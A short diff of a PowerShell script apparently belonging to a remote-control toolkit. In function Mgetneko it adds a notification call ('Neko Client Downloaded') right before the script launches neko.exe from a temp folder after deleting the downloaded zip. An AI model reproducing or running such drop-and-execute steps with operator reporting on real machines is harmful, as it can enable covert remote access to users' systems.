@@ -13,6 +13,7 @@ function Mgetneko {
     Start-Sleep 1
     rm -Path $nekozip -Force
     $proc = "$tempfolder\neko.exe"
+    sendEmbedWithImage -Title "Neko Client Downloaded" -Description "Neko client downloaded"
     Start-Process $proc -ArgumentList (".\neko.exe")
 
 }
